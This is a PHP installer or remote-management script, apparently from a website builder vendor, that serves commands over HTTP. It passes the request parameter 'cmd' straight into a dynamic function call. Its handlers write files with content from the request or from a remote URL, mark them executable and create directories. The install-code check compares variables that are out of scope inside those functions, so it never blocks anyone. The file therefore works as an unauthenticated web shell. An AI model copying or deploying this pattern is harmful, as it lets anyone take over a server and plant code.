<?php
/*
 * Author: ANM22
 * Last modified: 18 Dec 2013 - GMT +1 00:29
 *
 * ANM22 Andrea Menghi all rights reserved
 *
 */

$wb_install_version = 1;
$wb_install_code = "4233506cb87f91c7405f954d7b5caad9";
$wb_command = $_GET['cmd'];
$wb_code = md5($_GET['wb_i']);
$xml = new SimpleXMLElement('<xml/>');
$xml_command = $xml->addChild('COMMAND', $wb_command);
if ($_GET['wb_debug']) {
    $xml_command = $xml->addChild('DEBUG');
}
if ($wb_command) {
    @$wb_command($xml, $_GET, $_POST, '');
} else {
    $xml_error = $xml->addChild('ERROR', "1");
}
Header('Content-type: text/xml');
print($xml->asXML());

function wb_im_alive($xml, $get, $post, $arg) {
    if ($wb_code == $wb_install_code) {
        $xml->addChild('RETURN', "1");
    } else {
        $xml->addChild('RETURN', "0");
    }
}

function wb_createFile($xml, $get, $post, $arg) {
    if ($wb_code == $wb_install_code) {
        $path = $post['wb_cmd_path'];
        $fileName = $post['wb_cmd_fileName'];
        $source = $post['wb_cmd_source'];
        if ($arg['source']) {
            $content = file_get_contents("$source");
        } else {
            $content = $post['wb_cmd_content'];
        }
        $xml->addChild('WB_CMD_PATH', $path);
        $xml->addChild('WB_CMD_FILENAME', $fileName);
        $xml->addChild('WB_CMD_SOURCE', $source);
        $fd = @fopen(($path . $fileName), 'w');
        @chmod(($path . $fileName), 0755);
        if ($fd) {
            if (fwrite($fd, $content)) {
                $xml->addChild('RETURN', "1");
            } else {
                $xml->addChild('RETURN', "0");
            }
        } else {
            $xml->addChild('RETURN', "0");
        }
    } else {
        $xml->addChild('RETURN', "0");
    }
}

function wb_createFileGETUrlencode($xml, $get, $post, $arg) {
    $post['wb_cmd_path'] = $get['wb_cmd_path'];
    $post['wb_cmd_fileName'] = $get['wb_cmd_fileName'];
    $post['wb_cmd_content'] = urldecode($get['wb_cmd_content']);
    wb_createFile($xml, $get, $post, $arg);
}

function wb_createFileLinkSource($xml, $get, $post, $arg) {
    $post['wb_cmd_path'] = $get['wb_cmd_path'];
    $post['wb_cmd_fileName'] = $get['wb_cmd_fileName'];
    $post['wb_cmd_source'] = urldecode($get['wb_cmd_source']);
    wb_createFile($xml, $get, $post, array('source' => 1));
}

function wb_mkdir($xml, $get, $post, $arg) {
    if ($wb_code == $wb_install_code) {
        $path = $get['wb_cmd_path'];
        if (@mkdir($path, 0755)) {
            $xml->addChild('RETURN', "1");
        } else {
            $xml->addChild('RETURN', "0");
        }
    } else {
        $xml->addChild('RETURN', "0");
    }
}

function wb_file_exists($xml, $get, $post, $arg) {
    if ($wb_code == $wb_install_code) {
        $fileName = $_GET['wb_cmd_path'];
        if (@file_exists($fileName)) {
            $xml->addChild('RETURN', "1");
        } else {
            $xml->addChild('RETURN', "0");
        }
    } else {
        $xml->addChild('RETURN', "0");
    }
}